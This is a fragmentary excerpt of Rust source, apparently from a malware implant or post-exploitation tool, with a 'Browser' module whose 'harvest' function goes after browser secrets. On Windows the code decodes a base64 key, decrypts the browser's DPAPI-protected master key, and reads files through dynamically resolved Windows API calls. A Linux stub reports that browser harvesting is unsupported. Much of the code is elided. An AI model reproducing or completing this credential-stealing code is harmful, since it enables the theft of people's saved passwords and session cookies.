...
impl Browser {
                                ...
                                base64::engine::general_purpose::STANDARD.decode(key_b64)
                            {
                                ...
                                if key_bytes.len() > 5 {
                                    ...
                                    if let Ok(master_key) = self.decrypt_dpapi(dpapi_blob) {
                                        ...
                                        results.extend_from_slice(
                                            b"  [-] Failed to decrypt Master Key\n",
                                        );
                                    }
                                }
                            }
    ...
    fn read_file(&self, path: &str) -> Result<Vec<u8>, ()> {
        unsafe {
            ...
            if create_file.is_null() || read_file.is_null() || get_size.is_null() || close.is_null()
            {
                return Err(());
            }
            ...
            type FnReadFile =
                unsafe extern "system" fn(HANDLE, *mut u8, u32, *mut u32, *mut c_void) -> i32;
            ...
            if h_file == (-1isize as *mut c_void) {
                return Err(());
            }
    ...
    fn get_local_app_data(&self) -> alloc::string::String {
        unsafe {
            ...
            type FnGetEnvironmentVariableA =
                unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
...
impl Browser {
    pub fn harvest(&self) -> Result<Vec<u8>, ()> {
        Ok(alloc::vec::Vec::from(
            b"Browser harvesting not supported on Linux" as &[u8],
        ))
    }
}
